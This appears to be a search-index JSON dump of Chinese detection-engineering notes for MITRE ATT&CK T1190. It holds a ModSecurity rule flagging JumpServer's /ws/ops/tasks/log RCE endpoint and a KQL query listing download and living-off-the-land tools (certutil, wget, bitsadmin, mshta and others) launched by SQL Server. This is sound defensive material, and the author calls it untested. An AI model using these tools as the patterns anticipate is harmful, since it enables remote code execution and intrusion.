ModSecurity\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u8de8\u5e73\u53f0Web\u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899\uff08WAF\uff09\u5f15\u64ce\uff0c\u7528\u4e8eApache\uff0cIIS\u548cNginx\uff0c\u7531Trustwave\u7684SpiderLabs\u5f00\u53d1\u3002\u4f5c\u4e3aWAF\u4ea7\u54c1\uff0cModSecurity\u4e13\u95e8\u5173\u6ce8HTTP\u6d41\u91cf\uff0c\u5f53\u53d1\u51faHTTP\u8bf7\u6c42\u65f6\uff0cModSecurity\u68c0\u67e5\u8bf7\u6c42\u7684\u6240\u6709\u90e8\u5206\uff0c\u5982\u679c\u8bf7\u6c42\u662f\u6076\u610f\u7684\uff0c\u5b83\u4f1a\u88ab\u963b\u6b62\u548c\u8bb0\u5f55\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ JumpServer v2.6.1 RCE(\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c) \u590d\u73b0\u603b\u7ed3 https://www.cnblogs.com/w0x68y/p/14340249.html Jumpserver-RCE\u590d\u73b0\u53ca\u544a\u8b66\u89c4\u5219 https://www.freebuf.com/vuls/261199.html","title":"T1190-JumpServer v2.6.1 RCE\u653b\u51fb\u68c0\u6d4b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-JumpServer%20v2.6.1%20RCE%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B/#t1190-jumpserver-v261-rce","text":"","title":"T1190-JumpServer v2.6.1 RCE\u653b\u51fb\u68c0\u6d4b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-JumpServer%20v2.6.1%20RCE%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B/#attck","text":"\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-JumpServer%20v2.6.1%20RCE%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B/#jumpserver-v261-rce","text":"JumpServer \u662f\u4e00\u6b3e\u5f00\u6e90\u7684\u5821\u5792\u673a\uff0c\u662f\u7b26\u54084A\u89c4\u8303\u7684\u8fd0\u7ef4\u5b89\u5168\u5ba1\u8ba1\u7cfb\u7edf\uff0c\u901a\u4fd7\u6765\u8bf4\u5c31\u662f\u8df3\u677f\u673a. 2021\u5e741\u670815\u65e5\uff0cJumpServer \u53d1\u5e03\u5b89\u5168\u66f4\u65b0\uff0c\u4fee\u590d\u4e86\u4e00\u5904\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u3002\u7531\u4e8e JumpServer\u67d0\u4e9b\u63a5\u53e3\u672a\u505a\u6388\u6743\u9650\u5236\uff0c\u653b\u51fb\u8005\u53ef\u6784\u9020\u6076\u610f\u8bf7\u6c42\u83b7\u53d6\u654f\u611f\u4fe1\u606f\uff0c\u6216\u8005\u6267\u884c\u76f8\u5173\u64cd\u4f5c\u63a7\u5236\u5176\u4e2d\u6240\u6709\u673a\u5668\uff0c\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002","title":"JumpServer v2.6.1 RCE(\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c)"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-JumpServer%20v2.6.1%20RCE%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B/#_1","text":"JumpServer < v2.6.2 JumpServer < v2.5.4 JumpServer < v2.4.5 JumpServer = v1.5.9","title":"\u5f71\u54cd\u7248\u672c"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-JumpServer%20v2.6.1%20RCE%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B/#_2","text":"\u8bf7\u53c2\u8003\uff1a JumpServer v2.6.1 RCE(\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c) \u590d\u73b0\u603b\u7ed3 https://www.cnblogs.com/w0x68y/p/14340249.html Jumpserver-RCE\u590d\u73b0\u53ca\u544a\u8b66\u89c4\u5219 https://www.freebuf.com/vuls/261199.html","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-JumpServer%20v2.6.1%20RCE%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B/#_3","text":"\u8bbf\u95ee\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-JumpServer%20v2.6.1%20RCE%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B/#_4","text":"\u8bf7\u53c2\u8003\uff1a JumpServer v2.6.1 RCE(\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c) \u590d\u73b0\u603b\u7ed3 https://www.cnblogs.com/w0x68y/p/14340249.html","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-JumpServer%20v2.6.1%20RCE%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B/#_5","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-JumpServer%20v2.6.1%20RCE%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B/#_6","text":"modsecurity\u5224\u5b9a\u89c4\u5219 \u5728\u8fd9\u79cd\u573a\u666f\u4e0b\uff0c\u57fa\u672c\u4e0a\u770b\u5230\u8fd9\u4e2auri\u8bf7\u6c42\u6211\u4eec\u5c31\u53ef\u4ee5\u65ad\u8a00\u8fd9\u662f\u4e00\u4e2a\u62a5\u8b66\uff0c\u56e0\u6b64\u7f16\u5199\u89c4\u5219\u5982\u4e0b: SecRule REQUEST_URI \"/ws/ops/tasks/log\" \"id:11111111,phase:1,id:52,t:none,t:urlDecode,t:lowercase,t:normalizePath,msg:'jump-rce'\"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-JumpServer%20v2.6.1%20RCE%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B/#_7","text":"\u672c\u6587\u5185\u5bb9\u591a\u6570\u6458\u81ea\u4e92\u8054\u7f51\u7f51\u7edc\uff0c\u672a\u7ecf\u8fc7\u672c\u4eba\u5b9e\u9645\u73af\u5883\u6d4b\u8bd5\uff0c\u614e\u91cd\u4e0a\u7ebf\u4f7f\u7528\u3002 ModSecurity\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u8de8\u5e73\u53f0Web\u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899\uff08WAF\uff09\u5f15\u64ce\uff0c\u7528\u4e8eApache\uff0cIIS\u548cNginx\uff0c\u7531Trustwave\u7684SpiderLabs\u5f00\u53d1\u3002\u4f5c\u4e3aWAF\u4ea7\u54c1\uff0cModSecurity\u4e13\u95e8\u5173\u6ce8HTTP\u6d41\u91cf\uff0c\u5f53\u53d1\u51faHTTP\u8bf7\u6c42\u65f6\uff0cModSecurity\u68c0\u67e5\u8bf7\u6c42\u7684\u6240\u6709\u90e8\u5206\uff0c\u5982\u679c\u8bf7\u6c42\u662f\u6076\u610f\u7684\uff0c\u5b83\u4f1a\u88ab\u963b\u6b62\u548c\u8bb0\u5f55\u3002","title":"\u5907\u6ce8"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-JumpServer%20v2.6.1%20RCE%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B/#_8","text":"MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ JumpServer v2.6.1 RCE(\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c) \u590d\u73b0\u603b\u7ed3 https://www.cnblogs.com/w0x68y/p/14340249.html Jumpserver-RCE\u590d\u73b0\u53ca\u544a\u8b66\u89c4\u5219 https://www.freebuf.com/vuls/261199.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-SQL%20server%E6%BB%A5%E7%94%A8/","text":"T1190-\u68c0\u6d4bSQL server\u6ee5\u7528 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002 \u6d4b\u8bd5\u6848\u4f8b SQLServer\u63d0\u4f9b\u4e86\u5927\u91cf\u7528\u4e8e\u81ea\u52a8\u5316\u4efb\u52a1\u3001\u5bfc\u51fa\u6570\u636e\u548c\u8fd0\u884c\u811a\u672c\u7684\u5de5\u5177\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u91cd\u65b0\u5229\u7528\u8fd9\u4e9b\u5408\u6cd5\u5de5\u5177\u3002\u7531\u4e8e\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u8bb8\u591a\u5f3a\u5927\u7684\u547d\u4ee4\u8fdb\u884c\u653b\u51fb\uff0c\u56e0\u6b64\u67e5\u627e\u6d89\u53caSQL Server\u7684\u6076\u610f\u6d3b\u52a8\u53ef\u80fd\u4f1a\u5f88\u590d\u6742\u3002 \u6b64\u67e5\u8be2\u68c0\u6d4bSQL Server\u8fdb\u7a0b\u542f\u52a8shell\u4ee5\u8fd0\u884c\u4e00\u4e2a\u6216\u591a\u4e2a\u53ef\u7591\u547d\u4ee4\u7684\u5b9e\u4f8b\u3002 \u68c0\u6d4b\u65e5\u5fd7 \u672a\u7ecf\u6d4b\u8bd5\uff0c\u521d\u6b65\u5224\u65ad\u4e3awindows\u5b89\u5168\u65e5\u5fd7\u6216\u8005Sysmon\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u53c2\u8003 \u5982\u4f55\u901a\u8fc7SQL Server\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff1f https://zhuanlan.zhihu.com/p/25254794 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0\u5b9e\u6d4b\uff0c\u6545\u65e0\u7559\u75d5 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def DeviceProcessEvents | where Timestamp >= ago(10d) | where InitiatingProcessFileName in~ (\"sqlservr.exe\", \"sqlagent.exe\", \"sqlps.exe\", \"launchpad.exe\") //\u5f53\u521d\u59cb\u5316\u8fdb\u7a0b\u4e3a\"sqlservr.exe\", \"sqlagent.exe\", \"sqlps.exe\", \"launchpad.exe\" | summarize tostring(makeset(ProcessCommandLine)) //\u8fdb\u7a0b\u547d\u4ee4\u884c\u4e2d\u5305\u542b\u4ee5\u4e0b\u8fdb\u7a0b\u540d\u79f0OR\u547d\u4ee4\u884c\u53c2\u6570\u65f6\uff0c\u53ef\u80fd\u662f\u5f02\u5e38\u7684\u3002 by DeviceId, bin(Timestamp, 2m) | where set_ProcessCommandLine has \"certutil\" or set_ProcessCommandLine has \"netstat\" or set_ProcessCommandLine has \"ping\" or set_ProcessCommandLine has \"sysinfo\" or set_ProcessCommandLine has \"systeminfo\" or set_ProcessCommandLine has \"taskkill\" or set_ProcessCommandLine has \"wget\" or set_ProcessCommandLine has \"whoami\" or set_ProcessCommandLine has \"Invoke-WebRequest\" or set_ProcessCommandLine has \"Copy-Item\" or set_ProcessCommandLine has \"WebClient\" or set_ProcessCommandLine has \"advpack.dll\" or set_ProcessCommandLine has \"appvlp.exe\" or set_ProcessCommandLine has \"atbroker.exe\" or set_ProcessCommandLine has \"bash.exe\" or set_ProcessCommandLine has \"bginfo.exe\" or set_ProcessCommandLine has \"bitsadmin.exe\" or set_ProcessCommandLine has \"cdb.exe\" or set_ProcessCommandLine has \"certutil.exe\" or set_ProcessCommandLine has \"cl_invocation.ps1\" or set_ProcessCommandLine has \"cl_mutexverifiers.ps1\" or set_ProcessCommandLine has \"cmstp.exe\" or set_ProcessCommandLine has \"csi.exe\" or set_ProcessCommandLine has \"diskshadow.exe\" or set_ProcessCommandLine has \"dnscmd.exe\" or set_ProcessCommandLine has \"dnx.exe\" or set_ProcessCommandLine has \"dxcap.exe\" or set_ProcessCommandLine has \"esentutl.exe\" or set_ProcessCommandLine has \"expand.exe\" or set_ProcessCommandLine has \"extexport.exe\" or set_ProcessCommandLine has \"extrac32.exe\" or set_ProcessCommandLine has \"findstr.exe\" or set_ProcessCommandLine has \"forfiles.exe\" or set_ProcessCommandLine has \"ftp.exe\" or set_ProcessCommandLine has \"gpscript.exe\" or set_ProcessCommandLine has \"hh.exe\" or set_ProcessCommandLine has \"ie4uinit.exe\" or set_ProcessCommandLine has \"ieadvpack.dll\" or set_ProcessCommandLine has \"ieaframe.dll\" or set_ProcessCommandLine has \"ieexec.exe\" or set_ProcessCommandLine has \"infdefaultinstall.exe\" or set_ProcessCommandLine has \"installutil.exe\" or set_ProcessCommandLine has \"makecab.exe\" or set_ProcessCommandLine has \"manage-bde.wsf\" or set_ProcessCommandLine has \"mavinject.exe\" or set_ProcessCommandLine has \"mftrace.exe\" or set_ProcessCommandLine has \"microsoft.workflow.compiler.exe\" or set_ProcessCommandLine has \"mmc.exe\" or set_ProcessCommandLine has \"msbuild.exe\" or set_ProcessCommandLine has \"msconfig.exe\" or set_ProcessCommandLine has \"msdeploy.exe\" or set_ProcessCommandLine has \"msdt.exe\" or set_ProcessCommandLine has \"mshta.exe\" or set_ProcessCommandLine has \"mshtml.dll\" or set_ProcessCommandLine has \"msiexec.exe\" or set_ProcessCommandLine has \"msxsl.exe\" or set_ProcessCommandLine has \"odbcconf.exe\" or set_ProcessCommandLine has \"pcalua.exe\" or set_ProcessCommandLine has \"pcwrun.exe\" or set_ProcessCommandLine has \"pcwutl.dll\" or set_ProcessCommandLine has \"pester.bat\" or set_ProcessCommandLine has \"presentationhost.exe\" or set_ProcessCommandLine has \"pubprn.vbs\" or set_ProcessCommandLine has \"rcsi.exe\" or set_ProcessCommandLine has \"regasm.exe\" or set_ProcessCommandLine has \"register-cimprovider.exe\" or set_ProcessCommandLine has \"regsvcs.exe\" or set_ProcessCommandLine has \"regsvr32.exe\" or set_ProcessCommandLine has \"replace.exe\" or set_ProcessCommandLine has \"rundll32.exe\" or set_ProcessCommandLine has \"runonce.exe\" or set_ProcessCommandLine has \"runscripthelper.exe\" or set_ProcessCommandLine has \"schtasks.exe\" or set_ProcessCommandLine has \"scriptrunner.exe\" or set_ProcessCommandLine has \"setupapi.dll\" or set_ProcessCommandLine has \"shdocvw.dll\" or set_ProcessCommandLine has \"shell32.dll\" or set_ProcessCommandLine has \"slmgr.vbs\" or set_ProcessCommandLine has \"sqltoolsps.exe\" or set_ProcessCommandLine has \"syncappvpublishingserver.exe\" or set_ProcessCommandLine has \"syncappvpublishingserver.vbs\" or set_ProcessCommandLine has \"syssetup.dll\" or set_ProcessCommandLine has \"te.exe\" or set_ProcessCommandLine has \"tracker.exe\" or set_ProcessCommandLine has \"url.dll\" or set_ProcessCommandLine has \"verclsid.exe\" or set_ProcessCommandLine has \"vsjitdebugger.exe\" or set_ProcessCommandLine has \"wab.exe\" or set_ProcessCommandLine has \"winrm.vbs\" or set_ProcessCommandLine has \"wmic.exe\" or set_ProcessCommandLine has \"xwizard.exe\" or set_ProcessCommandLine has \"zipfldr.dll\" | sort by DeviceId , Timestamp asc \u89e3\u91ca\uff1a\u5f53\u521d\u59cb\u5316\u8fdb\u7a0b\u4e3a\"sqlservr.exe\"\uff0c\"sqlagent.exe\"\uff0c\"sqlps.exe\"\uff0c\"launchpad.exe\"\uff0c\u8fdb\u7a0b\u547d\u4ee4\u884c\u4e2d\u5305\u542b\u4ee5\u4e0a\u8fdb\u7a0b\u540d\u79f0OR\u547d\u4ee4\u884c\u53c2\u6570\u65f6\uff0c\u53ef\u80fd\u662f\u5f02\u5e38\u7684\u3002 \u5efa\u8bae \u672a\u7ecf\u5b9e\u9645\u6d4b\u8bd5\uff0c\u4ec5\u5177\u5907\u4e00\u5b9a\u7684\u53c2\u8003\u4ef7\u503c\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/","title":"T1190-\u68c0\u6d4bSQL server\u6ee5\u7528"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-SQL%20server%E6%BB%A5%E7%94%A8/#t1190-sql-server","text":"","title":"T1190-\u68c0\u6d4bSQL server\u6ee5\u7528"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-SQL%20server%E6%BB%A5%E7%94%A8/#attck","text":"\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-SQL%20server%E6%BB%A5%E7%94%A8/#_1","text":"SQLServer\u63d0\u4f9b\u4e86\u5927\u91cf\u7528\u4e8e\u81ea\u52a8\u5316\u4efb\u52a1\u3001\u5bfc\u51fa\u6570\u636e\u548c\u8fd0\u884c\u811a\u672c\u7684\u5de5\u5177\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u91cd\u65b0\u5229\u7528\u8fd9\u4e9b\u5408\u6cd5\u5de5\u5177\u3002\u7531\u4e8e\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u8bb8\u591a\u5f3a\u5927\u7684\u547d\u4ee4\u8fdb\u884c\u653b\u51fb\uff0c\u56e0\u6b64\u67e5\u627e\u6d89\u53caSQL Server\u7684\u6076\u610f\u6d3b\u52a8\u53ef\u80fd\u4f1a\u5f88\u590d\u6742\u3002 \u6b64\u67e5\u8be2\u68c0\u6d4bSQL Server\u8fdb\u7a0b\u542f\u52a8shell\u4ee5\u8fd0\u884c\u4e00\u4e2a\u6216\u591a\u4e2a\u53ef\u7591\u547d\u4ee4\u7684\u5b9e\u4f8b\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-SQL%20server%E6%BB%A5%E7%94%A8/#_2","text":"\u672a\u7ecf\u6d4b\u8bd5\uff0c\u521d\u6b65\u5224\u65ad\u4e3awindows\u5b89\u5168\u65e5\u5fd7\u6216\u8005Sysmon\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-SQL%20server%E6%BB%A5%E7%94%A8/#_3","text":"\u53c2\u8003 \u5982\u4f55\u901a\u8fc7SQL Server\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff1f https://zhuanlan.zhihu.com/p/25254794","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-SQL%20server%E6%BB%A5%E7%94%A8/#_4","text":"\u6682\u65e0\u5b9e\u6d4b\uff0c\u6545\u65e0\u7559\u75d5","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-SQL%20server%E6%BB%A5%E7%94%A8/#_5","text":"DeviceProcessEvents | where Timestamp >= ago(10d) | where InitiatingProcessFileName in~ (\"sqlservr.exe\", \"sqlagent.exe\", \"sqlps.exe\", \"launchpad.exe\") //\u5f53\u521d\u59cb\u5316\u8fdb\u7a0b\u4e3a\"sqlservr.exe\", \"sqlagent.exe\", \"sqlps.exe\", \"launchpad.exe\" | summarize tostring(makeset(ProcessCommandLine)) //\u8fdb\u7a0b\u547d\u4ee4\u884c\u4e2d\u5305\u542b\u4ee5\u4e0b\u8fdb\u7a0b\u540d\u79f0OR\u547d\u4ee4\u884c\u53c2\u6570\u65f6\uff0c\u53ef\u80fd\u662f\u5f02\u5e38\u7684\u3002 by DeviceId, bin(Timestamp, 2m) | where set_ProcessCommandLine has \"certutil\" or set_ProcessCommandLine has \"netstat\" or set_ProcessCommandLine has \"ping\" or set_ProcessCommandLine has \"sysinfo\" or set_ProcessCommandLine has \"systeminfo\" or set_ProcessCommandLine has \"taskkill\" or set_ProcessCommandLine has \"wget\" or set_ProcessCommandLine has \"whoami\" or set_ProcessCommandLine has \"Invoke-WebRequest\" or set_ProcessCommandLine has \"Copy-Item\" or set_ProcessCommandLine has \"WebClient\" or set_ProcessCommandLine has \"advpack.dll\" or set_ProcessCommandLine has \"appvlp.exe\" or set_ProcessCommandLine has \"atbroker.exe\" or set_ProcessCommandLine has \"bash.exe\" or set_ProcessCommandLine has \"bginfo.exe\" or set_ProcessCommandLine has \"bitsadmin.exe\" or set_ProcessCommandLine has \"cdb.exe\" or set_ProcessCommandLine has \"certutil.exe\" or set_ProcessCommandLine has \"cl_invocation.ps1\" or set_ProcessCommandLine has \"cl_mutexverifiers.ps1\" or set_ProcessCommandLine has \"cmstp.exe\" or set_ProcessCommandLine has \"csi.exe\" or set_ProcessCommandLine has \"diskshadow.exe\" or set_ProcessCommandLine has \"dnscmd.exe\" or set_ProcessCommandLine has \"dnx.exe\" or set_ProcessCommandLine has \"dxcap.exe\" or set_ProcessCommandLine has \"esentutl.exe\" or set_ProcessCommandLine has \"expand.exe\" or set_ProcessCommandLine has \"extexport.exe\" or set_ProcessCommandLine has \"extrac32.exe\" or set_ProcessCommandLine has \"findstr.exe\" or set_ProcessCommandLine has \"forfiles.exe\" or set_ProcessCommandLine has \"ftp.exe\" or set_ProcessCommandLine has \"gpscript.exe\" or set_ProcessCommandLine has \"hh.exe\" or set_ProcessCommandLine has \"ie4uinit.exe\" or set_ProcessCommandLine has \"ieadvpack.dll\" or set_ProcessCommandLine has \"ieaframe.dll\" or set_ProcessCommandLine has \"ieexec.exe\" or set_ProcessCommandLine has \"infdefaultinstall.exe\" or set_ProcessCommandLine has \"installutil.exe\" or set_ProcessCommandLine has \"makecab.exe\" or set_ProcessCommandLine has \"manage-bde.wsf\" or set_ProcessCommandLine has \"mavinject.exe\" or set_ProcessCommandLine has \"mftrace.exe\" or set_ProcessCommandLine has \"microsoft.workflow.compiler.exe\" or set_ProcessCommandLine has \"mmc.exe\" or set_ProcessCommandLine has 